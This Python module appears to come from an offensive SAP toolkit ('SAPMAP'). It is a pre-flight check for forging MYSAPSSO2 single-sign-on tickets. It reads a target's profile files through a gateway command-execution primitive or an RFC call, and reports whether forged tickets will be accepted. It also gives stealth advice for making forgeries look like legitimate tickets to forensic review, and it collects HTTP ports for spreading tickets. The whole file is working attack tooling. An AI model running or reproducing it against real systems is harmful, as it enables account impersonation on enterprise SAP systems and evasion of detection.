#!/usr/bin/env python3
"""SAPMAP — SAP profile parameter pre-flight check for SSO2 forgery.

Reads SAP profile files (``DEFAULT.PFL`` + instance profiles under
``/usr/sap/<SID>/SYS/profile/``) via the existing sapxpg /
``base64 <path>`` primitive and reports whether the system is
configured to accept and create MYSAPSSO2 logon tickets in the
shape our forger emits.

Three parameters matter for the ticket-forgery flow:

  * ``login/accept_sso2_ticket``    — Hard gate.  Must be ``1`` on
        any node that will receive our forged ticket.  If ``0``
        the kernel rejects the cookie outright and our HTTP/RFC
        replay returns ``Anmeldung fehlgeschlagen`` regardless of
        how cleanly the ticket is signed.

  * ``login/create_sso2_ticket``    — Stealth signal.  Tells us
        whether *legitimate* tickets emitted by this AS embed the
        signing certificate (``1``) or not (``2``).  Our forger
        defaults to ``include_cert=True``; if the source system
        emits cert-less tickets (``=2``) our tickets are
        structurally distinguishable from real ones unless we
        flip ``include_cert=False``.  Not a functional gate, but
        a fingerprinting concern for operators caring about
        forensic plausibility.

  * ``login/sso2_ticket_strict_owner_check`` — Validation tightness.
        When ``1`` the kernel enforces a strict Owner DN / Issuer
        DN check against TWPSSO2ACL.  Our forger pulls the issuer
        DN from ``SAPSYS.pse`` so this should still pass, but the
        operator should know that any DN drift means rejection.

Output is a structured dict — see ``check_sso2_parameters`` for
the exact shape.  Designed to be safe to call from the
orchestrator and from a standalone CLI sanity tool.
"""
from __future__ import annotations

import os
import sys
from typing import Callable, Optional

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)

# Reuse the sapxpg file-read primitive from sap_pse_loot.  Both
# modules share the same OS-access layer, so we don't duplicate
# the chunked-read adapter or the base64 decode wrapper.
try:
    from sap_pse_loot import _read_file_b64
except ImportError:  # pragma: no cover — only triggered if module
    # is consumed in isolation without the full package layout
    _read_file_b64 = None  # type: ignore


# ---------------------------------------------------------------------
# Profile parser — pure-Python, no deps
# ---------------------------------------------------------------------

def parse_profile_lines(text: str) -> dict[str, str]:
    """Parse SAP profile-file text into a dict of param → value.

    Profile files are plain INI-style key/value pairs:

        login/accept_sso2_ticket = 1
        login/create_sso2_ticket=2     # no spaces around equals
        # comment line
        rdisp/wp_no_dia = 10

    Rules:
      * Comments start with ``#`` (and inline ``#`` after a value
        is also stripped — matches SAP's own parser).
      * Whitespace around ``=`` and around keys/values is stripped.
      * Empty lines are skipped.
      * Lines without ``=`` are skipped.
      * Last occurrence wins (matches SAP's profile-merge order:
        instance profile overrides DEFAULT.PFL).

    Args:
        text: Raw profile file contents (UTF-8 / ASCII).

    Returns:
        Dict mapping param name to its string value.  Values are
        always strings; callers should cast as needed.
    """
    params: dict[str, str] = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" not in line:
            continue
        # Strip inline comment if present
        if "#" in line:
            line = line.split("#", 1)[0].rstrip()
        key, _, value = line.partition("=")
        key = key.strip()
        value = value.strip()
        if not key:
            continue
        params[key] = value
    return params


# ---------------------------------------------------------------------
# Profile discovery + read
# ---------------------------------------------------------------------

_DEFAULT_PROFILE_DIR_TPL = "/usr/sap/{sid}/SYS/profile"
_DEFAULT_PROFILE_FILE = "DEFAULT.PFL"


def profile_dir(sid: str) -> str:
    """Canonical SAP profile directory for a given SID."""
    return _DEFAULT_PROFILE_DIR_TPL.format(sid=sid.upper())


def default_profile_path(sid: str) -> str:
    """Path to ``DEFAULT.PFL`` for a given SID."""
    return f"{profile_dir(sid)}/{_DEFAULT_PROFILE_FILE}"


def discover_instance_profiles(gw_exec_fn: Callable,
                                sid: str) -> list[str]:
    """List instance-profile files alongside DEFAULT.PFL.

    SAP names instance profiles as ``<SID>_<INST_TYPE><INST_NR>_<host>``
    e.g. ``S4H_D00_s4h.corp.local``.  This helper lists the
    profile directory and returns paths that look like instance
    profiles (start with ``<SID>_`` and aren't DEFAULT.PFL).

    Args:
        gw_exec_fn: Callable matching the SAPMAP GW exec signature
            (``fn(cmd, target) -> {success, stdout, ...}``).
        sid: System ID (e.g. "S4H").

    Returns:
        List of absolute profile paths.  Empty if listing fails.
    """
    if not gw_exec_fn:
        return []
    sid_u = sid.upper()
    target_dir = profile_dir(sid_u)
    try:
        # ls -1 gives one filename per line — most robust across
        # shells.  We don't sort — caller treats them as a set.
        result = gw_exec_fn("ls -1", target_dir)
    except Exception:
        return []
    if not isinstance(result, dict) or not result.get("success"):
        return []
    stdout = result.get("stdout", "") or ""
    if isinstance(stdout, bytes):
        stdout = stdout.decode("utf-8", errors="replace")
    profiles: list[str] = []
    for line in stdout.splitlines():
        name = line.strip()
        if not name or name == _DEFAULT_PROFILE_FILE:
            continue
        # Skip backup / readme / non-profile files.  SAP doesn't
        # use suffixes — instance profiles are bare names.
        if "." in name and not name.startswith(f"{sid_u}_"):
            continue
        if not name.startswith(f"{sid_u}_"):
            continue
        profiles.append(f"{target_dir}/{name}")
    return profiles


def read_profile_file(gw_exec_fn: Callable, path: str) -> dict:
    """Read a SAP profile file via the sapxpg base64 primitive.

    Wraps :func:`sap_pse_loot._read_file_b64` to decode the result
    as UTF-8 text (profile files are always ASCII/Latin-1).

    Args:
        gw_exec_fn: SAPMAP GW exec callable.
        path: Absolute file path on the target.

    Returns:
        Dict ``{success: bool, text: str, error: str, path: str}``.
    """
    if _read_file_b64 is None:
        return {"success": False, "text": "", "path": path,
                "error": "sap_pse_loot._read_file_b64 unavailable "
                         "— SAPMAP postex module path not set up"}
    raw = _read_file_b64(gw_exec_fn, path)
    if not raw.get("success"):
        return {"success": False, "text": "", "path": path,
                "error": raw.get("error",
                                  "base64 read failed (no detail)")}
    blob = raw.get("bytes") or b""
    try:
        text = blob.decode("utf-8", errors="replace")
    except Exception as exc:
        return {"success": False, "text": "", "path": path,
                "error": f"decode failed: {exc}"}
    return {"success": True, "text": text, "path": path,
            "error": ""}


# ---------------------------------------------------------------------
# Evaluation logic — what the params mean for our forger
# ---------------------------------------------------------------------

# Parameters we care about + their semantics.  Keep this table data-
# driven so the GUI / CLI can render the same explanations the
# evaluation logic uses.
SSO2_PARAMETERS: dict[str, dict] = {
    "login/accept_sso2_ticket": {
        "description":
            "AS accepts MYSAPSSO2 cookies for SSO logon.",
        "values": {
            "0": "Disabled — kernel rejects all SSO2 cookies "
                 "(forged ticket WILL be rejected)",
            "1": "Enabled — kernel validates SSO2 tickets via "
                 "TWPSSO2ACL (required for our forgery to land)",
        },
        "required_for_forgery": "1",
        "severity_if_wrong": "ERROR",
    },
    "login/create_sso2_ticket": {
        "description":
            "AS creates SSO2 tickets on successful logon.",
        "values": {
            "0": "Don't create",
            "1": "Create SSO2 ticket WITH embedded signing cert",
            "2": "Create SSO2 ticket WITHOUT embedded cert",
            "3": "Create assertion tickets only (different format)",
        },
        "required_for_forgery": None,  # Informational
        "severity_if_wrong": "INFO",
        "stealth_implication":
            "Tells us whether *legitimate* tickets on this AS embed "
            "the cert.  Match this in forge_ticket(include_cert=...) "
            "for maximum forensic plausibility.",
    },
    "login/sso2_ticket_strict_owner_check": {
        "description":
            "Strict check on ticket Owner/Issuer DN.",
        "values": {
            "0": "Lenient — any issuer in TWPSSO2ACL is accepted",
            "1": "Strict — owner DN must exactly match a "
                 "TWPSSO2ACL entry for the recipient client",
        },
        "required_for_forgery": None,
        "severity_if_wrong": "INFO",
        "stealth_implication":
            "When 1, our forged ticket's issuer DN (pulled from "
            "SAPSYS.pse) MUST match the recipient client's "
            "TWPSSO2ACL entry exactly.  Drift on either side = "
            "rejection.",
    },
}


def extract_icm_ports(params: dict[str, str]) -> list[dict]:
    """Extract HTTP/HTTPS ICM service ports from profile parameters.

    SAP defines its ICM service ports via numbered profile entries:

        icm/server_port_0 = PROT=HTTP,PORT=8000,TIMEOUT=180,PROCTIMEOUT=900
        icm/server_port_1 = PROT=HTTPS,PORT=44300,TIMEOUT=180,PROCTIMEOUT=900
        icm/server_port_2 = PROT=SMTP,PORT=25000,TIMEOUT=180
        icm/server_port_3 = PROT=HTTPS,PORT=8443,SSLCONFIG=...

    Each line is a comma-separated key=value list with no fixed
    field order.  We only care about ``PROT`` and ``PORT``; everything
    else (TIMEOUT, PROCTIMEOUT, SSLCONFIG, HOST, EXTBIND, ...) is
    informational.

    The ``icm/server_port_<N>`` index is sequential — operators
    typically use 0, 1, 2, ... but gaps are allowed.  We discover
    every ``icm/server_port_*`` key present in the merged params,
    not just 0..N.

    This is the authoritative source for "which TCP ports does this
    AS actually listen on for HTTP/HTTPS?" — much more reliable
    than guessing 8000+sysnr / 44300+sysnr, because:

      * SAP installations frequently override the default ports
        (HTTPS on 8443 instead of 44300, multiple HTTP listeners
        for different virtual hosts, etc.)
      * The scanner sometimes tags wrong ports as "http" (e.g. the
        ICM admin endpoint on 1128 responds to HTTP probes but
        never accepts MYSAPSSO2 cookies for ICF auth)

    Args:
        params: Merged profile params from
            :func:`parse_profile_lines` (or the merged dict
            stored in ``check_sso2_parameters`` result).

    Returns:
        List of ``{port: int, protocol: str, raw: str, index: int}``
        dicts, one per HTTP/HTTPS service port discovered.  Empty
        list when no ICM ports are configured (e.g. when reading a
        DEFAULT.PFL on a non-ABAP node).  ``protocol`` is normalised
        to lowercase ("http" or "https"); SMTP/P4/SOLMAN/etc.
        entries are filtered out.
    """
    out: list[dict] = []
    for key, raw_value in params.items():
        if not key.startswith("icm/server_port_"):
            continue
        # Index is the suffix after the trailing underscore
        try:
            index = int(key.rsplit("_", 1)[1])
        except (ValueError, IndexError):
            index = -1
        # Parse comma-separated kv pairs.  SAP uses upper-case keys
        # in the canonical examples, but we treat key lookup as
        # case-insensitive to be defensive against operator-edited
        # profiles.
        fields = {}
        for chunk in raw_value.split(","):
            chunk = chunk.strip()
            if "=" not in chunk:
                continue
            k, _, v = chunk.partition("=")
            fields[k.strip().upper()] = v.strip()
        protocol_raw = fields.get("PROT", "").strip().upper()
        port_raw = fields.get("PORT", "").strip()
        if not protocol_raw or not port_raw:
            continue
        try:
            port = int(port_raw)
        except ValueError:
            continue
        if port <= 0 or port > 65535:
            continue
        protocol = protocol_raw.lower()
        # Only HTTP/HTTPS are useful for cookie-based propagation.
        # SMTP/P4/HTTP2/HTTPSCM/etc. either don't accept cookies or
        # use different auth mechanisms.
        if protocol not in ("http", "https"):
            continue
        out.append({
            "port": port,
            "protocol": protocol,
            "raw": raw_value,
            "index": index,
        })
    # Stable order: by profile index (matches SAP's own ordering)
    out.sort(key=lambda e: e["index"])
    return out


def evaluate_sso2_config(params: dict[str, str]) -> dict:
    """Evaluate parsed profile params against the forgery flow.

    Args:
        params: Output of :func:`parse_profile_lines` (or the
            merged result of multiple profile files).

    Returns:
        Dict with these keys:
          * ``ok`` (bool): True iff no ERROR-severity issues found.
          * ``errors`` (list[str]): Hard gates the operator must
            fix before the forged ticket can be accepted.
          * ``warnings`` (list[str]): Stealth / fingerprinting
            concerns that don't block the attack.
          * ``recommend_include_cert`` (Optional[bool]): Based on
            ``login/create_sso2_ticket``.  None if the parameter
            wasn't found in the profile.
          * ``observed`` (dict[str, str]): The subset of
            interesting params actually present in the profile.
    """
    errors: list[str] = []
    warnings: list[str] = []
    observed: dict[str, str] = {}

    # 1. accept_sso2_ticket — hard gate
    accept = params.get("login/accept_sso2_ticket")
    if accept is not None:
        observed["login/accept_sso2_ticket"] = accept
        if accept != "1":
            errors.append(
                f"login/accept_sso2_ticket={accept} — kernel will "
                f"reject forged tickets.  Set to 1 (RZ11 or profile) "
                f"on the receiver, then restart the AS.")
    else:
        warnings.append(
            "login/accept_sso2_ticket not set in profile — "
            "default depends on kernel version.  Modern S/4 "
            "defaults to 1, older NW7.0x defaults to 0.  "
            "Verify via RZ11 before relying on the forgery.")

    # 2. create_sso2_ticket — stealth + cert recommendation
    create = params.get("login/create_sso2_ticket")
    recommend_include_cert: Optional[bool] = None
    if create is not None:
        observed["login/create_sso2_ticket"] = create
        if create == "2":
            recommend_include_cert = False
            warnings.append(
                "login/create_sso2_ticket=2 — legitimate tickets on "
                "this AS do NOT embed the signing cert.  Forge with "
                "include_cert=False to match (currently the forger "
                "defaults to True).")
        elif create == "1":
            recommend_include_cert = True  # Current forger default
        elif create == "0":
            warnings.append(
                "login/create_sso2_ticket=0 — this AS doesn't "
                "create SSO2 tickets at all.  A forged ticket "
                "arriving here will look anomalous in dev_w "
                "traces (no precedent).")
        elif create == "3":
            warnings.append(
                "login/create_sso2_ticket=3 — assertion-ticket "
                "mode (different wire format).  Standard MYSAPSSO2 "
                "tickets may still work but blend less well.")

    # 3. strict_owner_check — issuer DN must match exactly
    strict = params.get("login/sso2_ticket_strict_owner_check")
    if strict is not None:
        observed["login/sso2_ticket_strict_owner_check"] = strict
        if strict == "1":
            warnings.append(
                "login/sso2_ticket_strict_owner_check=1 — strict "
                "issuer-DN matching.  Verify the receiver's "
                "TWPSSO2ACL contains the exact Owner DN our "
                "forged ticket carries (CN matches SAPSYS.pse).")

    return {
        "ok": not errors,
        "errors": errors,
        "warnings": warnings,
        "recommend_include_cert": recommend_include_cert,
        "observed": observed,
    }


# ---------------------------------------------------------------------
# RFC-based parameter read via PFL_GET_SINGLE_PARAMETER
# ---------------------------------------------------------------------

# Parameters to query when running the SSO2 pre-flight check via RFC.
# Three SSO2 gating/stealth params + a sweep of icm/server_port_<N>
# entries (0..N) to discover the AS's HTTP/HTTPS listeners.
#
# Limit the icm sweep to 0..19 — every SAP installation I've seen
# keeps the ICM ports in a low contiguous range, and beyond 20 the
# overhead of RFC round-trips for empty responses outweighs the
# chance of discovering additional listeners.
_SSO2_PARAMS_TO_QUERY = (
    "login/accept_sso2_ticket",
    "login/create_sso2_ticket",
    "login/sso2_ticket_strict_owner_check",
)
_ICM_PORT_SWEEP_RANGE = range(0, 20)


def check_sso2_via_rfc(node,
                         creds=None,
                         conn_factory: Optional[Callable] = None
                         ) -> dict:
    """Read SSO2 + ICM port params via RFC ``PFL_GET_SINGLE_PARAMETER``.

    Replaces the OS-access-based profile read (which goes through
    sapxpg + chunked base64 reads — 30-60 s per profile file on
    kernel 793+) with a much faster RFC path that returns each
    parameter's *active* runtime value (reflecting both the
    profile file AND any RZ11 dynamic changes since the AS came
    up).

    Architectural advantages over the profile-read path:

      * Needs only an ABAP RFC credential, not OS access — easier
        prereq, available much earlier in the AutoPwn / manual
        exploitation flow.
      * Each parameter = one RFC round-trip (~50-200 ms vs. 30 s).
      * Reads the *active* runtime value — picks up RZ11 changes
        the profile files don't reflect until the next AS restart.
      * Function module ``PFL_GET_SINGLE_PARAMETER`` (function
        group SPFL) is remote-enabled by default and callable by
        any user with basic RFC auth — no S_SETPARAM or other
        special privilege required.

    Args:
        node: :class:`SAPNode` of the target.  Used to derive
            ``ashost`` / ``saprouter`` and as the default source
            for ``creds`` via :meth:`SAPNode.best_credentials`.
        creds: Optional :class:`Credentials` override.  When None
            (default), uses ``node.best_credentials()``.
        conn_factory: Callable returning an open RFC connection
            context manager.  Override for tests — production
            callers leave this None to get the canonical
            ``sapmap_rfc._get_connection``.

    Returns:
        Same dict shape as :func:`check_sso2_via_profile`, with:
          * ``source = "rfc:PFL_GET_SINGLE_PARAMETER"``
          * ``profiles_read = []`` (no files were read)
          * ``profiles_failed = []``
          * Other fields populated by :func:`evaluate_sso2_config`
            and :func:`extract_icm_ports` from the merged params.
    """
    # Stub structure callers can rely on
    def _err_result(errors: list) -> dict:
        return {
            "ok": False,
            "errors": errors,
            "warnings": [],
            "recommend_include_cert": None,
            "observed": {},
            "profiles_read": [],
            "profiles_failed": [],
            "merged_params": {},
            "icm_ports": [],
            "source": "rfc:PFL_GET_SINGLE_PARAMETER",
        }

    # ── Resolve a connection factory ──────────────────────────────
    if conn_factory is None:
        try:
            from sapmap_rfc import _get_connection
        except ImportError as e:
            return _err_result([
                f"sapmap_rfc unavailable ({e}); cannot run "
                f"RFC-based SSO2 check"])

        def conn_factory():
            return _get_connection(node, creds)

    # ── Open the connection ───────────────────────────────────────
    try:
        conn_ctx = conn_factory()
    except ValueError as e:
        # _get_connection raises ValueError when no credentials
        # are available
        return _err_result([
            f"no usable ABAP credentials for {node.sid}: {e}"])
    except ImportError as e:
        return _err_result([
            f"NW RFC SDK / ctypes binding unavailable ({e})"])
    except Exception as e:
        return _err_result([
            f"RFC connection setup failed: "
            f"{type(e).__name__}: {e}"])

    # ── Query each parameter ──────────────────────────────────────
    merged: dict[str, str] = {}
    rfc_errors: list = []

    try:
        with conn_ctx as conn:
            # SSO2 gating params first — these are the must-haves
            for name in _SSO2_PARAMS_TO_QUERY:
                value = _call_pfl_get(conn, name)
                if value is not None:
                    merged[name] = value

            # ICM port sweep — empty responses mean "no port at
            # this index", which is the normal way to know we've
            # gone past the last configured listener.
            for idx in _ICM_PORT_SWEEP_RANGE:
                name = f"icm/server_port_{idx}"
                value = _call_pfl_get(conn, name)
                if value is None or not value.strip():
                    # First empty index ends the sweep — SAP
                    # always uses contiguous indices in practice,
                    # so a gap means no more ports.
                    if idx > 0:
                        break
                    continue
                merged[name] = value
    except Exception as e:
        # Any unhandled exception during the parameter-query phase
        # (connection drop, auth failure mid-stream, ...) — return
        # what we managed to collect plus the error context.
        rfc_errors.append(
            f"RFC query aborted: {type(e).__name__}: {e}")

    # ── Evaluate the collected params ─────────────────────────────
    if not merged and rfc_errors:
        result = _err_result(rfc_errors)
        return result

    result = evaluate_sso2_config(merged)
    result["profiles_read"] = []   # RFC: no files read
    result["profiles_failed"] = []
    result["merged_params"] = merged
    result["icm_ports"] = extract_icm_ports(merged)
    result["source"] = "rfc:PFL_GET_SINGLE_PARAMETER"
    # Append any non-fatal RFC errors as warnings so the operator
    # sees them but the check still reports successfully on the
    # params we did manage to read.
    if rfc_errors:
        result["warnings"] = list(result.get("warnings", [])) + rfc_errors
    return result


def _call_pfl_get(conn, parameter_name: str) -> Optional[str]:
    """Call ``PFL_GET_SINGLE_PARAMETER`` and return the value string.

    Returns the trimmed PARAMETER_VALUE on success, ``None`` when
    the call raises (typically because the parameter isn't set in
    the active profile — SAP returns CX_SY_RFC for unknown
    parameter names; we treat that as "not set").
    """
    try:
        r = conn.call("PFL_GET_SINGLE_PARAMETER",
                       PARAMETER_NAME=parameter_name)
    except Exception:
        return None
    if not isinstance(r, dict):
        return None
    val = r.get("PARAMETER_VALUE") or r.get("parameter_value") or ""
    if not isinstance(val, str):
        return None
    return val.strip()


# ---------------------------------------------------------------------
# Top-level entry point — read + parse + evaluate
# ---------------------------------------------------------------------

def check_sso2_parameters(gw_exec_fn: Callable,
                            sid: str,
                            include_instance_profiles: bool = True
                            ) -> dict:
    """Read SAP profile files and evaluate SSO2 readiness.

    Pipeline:
      1. Read ``DEFAULT.PFL`` (the global profile).
      2. Optionally discover + read instance profiles
         (``<SID>_<INST>_<host>``).  Instance profile params
         override DEFAULT.PFL — same as SAP's runtime merge.
      3. Parse all profile files into a single merged param dict.
      4. Evaluate the merged params against the forgery flow.

    Args:
        gw_exec_fn: SAPMAP GW exec callable (typically wrapped by
            ``make_chunked_read_adapter`` to handle large file
            reads via chunked python3 reads).
        sid: System ID, used to construct profile paths.
        include_instance_profiles: When True (default) also reads
            instance profiles; when False only DEFAULT.PFL is read.

    Returns:
        Dict combining :func:`evaluate_sso2_config` output with
        provenance metadata:

            {
              "ok": bool,
              "errors": list[str],
              "warnings": list[str],
              "recommend_include_cert": Optional[bool],
              "observed": dict[str, str],
              "profiles_read": list[str],
              "profiles_failed": list[dict],   # {path, error}
              "merged_params": dict[str, str],
            }
    """
    sid_u = sid.upper()
    profiles_read: list[str] = []
    profiles_failed: list[dict] = []
    merged: dict[str, str] = {}

    # DEFAULT.PFL first (global, gets overridden by instance)
    default_path = default_profile_path(sid_u)
    default = read_profile_file(gw_exec_fn, default_path)
    if default.get("success"):
        merged.update(parse_profile_lines(default["text"]))
        profiles_read.append(default_path)
    else:
        profiles_failed.append({"path": default_path,
                                 "error": default.get("error", "")})

    # Instance profiles (override DEFAULT.PFL on per-param basis)
    if include_instance_profiles:
        for inst_path in discover_instance_profiles(gw_exec_fn,
                                                     sid_u):
            inst = read_profile_file(gw_exec_fn, inst_path)
            if inst.get("success"):
                merged.update(parse_profile_lines(inst["text"]))
                profiles_read.append(inst_path)
            else:
                profiles_failed.append({"path": inst_path,
                                         "error": inst.get(
                                             "error", "")})

    # If nothing was read, surface that as a hard error — we can't
    # evaluate anything without profile access.
    if not profiles_read:
        return {
            "ok": False,
            "errors": [
                f"could not read any SAP profile under "
                f"{profile_dir(sid_u)} — check sapxpg/OS access"],
            "warnings": [],
            "recommend_include_cert": None,
            "observed": {},
            "profiles_read": [],
            "profiles_failed": profiles_failed,
            "merged_params": {},
            "icm_ports": [],
            "source": "profile:DEFAULT.PFL+instance",
        }

    result = evaluate_sso2_config(merged)
    result["profiles_read"] = profiles_read
    result["profiles_failed"] = profiles_failed
    result["merged_params"] = merged
    # ── ICM HTTP/HTTPS service ports ───────────────────────────────
    # Same profile files that carry the SSO2 params also carry the
    # ``icm/server_port_<N>`` entries — extract them here so callers
    # (notably ticket propagation) have authoritative port info
    # without a second profile-read round-trip.
    result["icm_ports"] = extract_icm_ports(merged)
    result["source"] = "profile:DEFAULT.PFL+instance"
    return result


# ---------------------------------------------------------------------
# Human-readable summary — used by the orchestrator + CLI
# ---------------------------------------------------------------------

def format_check_summary(check: dict, verbose: bool = False) -> str:
    """Render a check_sso2_parameters() result as printable text.

    The orchestrator (extract_and_forge_ticket) prints this just
    before forging so the operator sees any blockers/warnings
    inline with the rest of the attack flow.

    Args:
        check: Dict from :func:`check_sso2_parameters`.
        verbose: When True, also lists every profile file read
            and the merged param dict.

    Returns:
        Multi-line string suitable for direct print/log output.
    """
    lines: list[str] = []
    if check.get("ok"):
        lines.append("[+] SSO2 profile check: OK")
    else:
        lines.append("[!] SSO2 profile check: FAILED")
    for err in check.get("errors", []):
        lines.append(f"    [-] {err}")
    for warn in check.get("warnings", []):
        lines.append(f"    [?] {warn}")
    rec = check.get("recommend_include_cert")
    if rec is not None:
        lines.append(
            f"    [i] recommended include_cert={rec} "
            f"(based on observed login/create_sso2_ticket)")
    if verbose:
        for p in check.get("profiles_read", []):
            lines.append(f"    [r] read: {p}")
        for f in check.get("profiles_failed", []):
            lines.append(f"    [-] failed: {f['path']} "
                          f"({f['error']})")
        observed = check.get("observed", {})
        if observed:
            lines.append("    [i] observed params:")
            for k, v in observed.items():
                lines.append(f"        {k} = {v}")
    return "\n".join(lines)
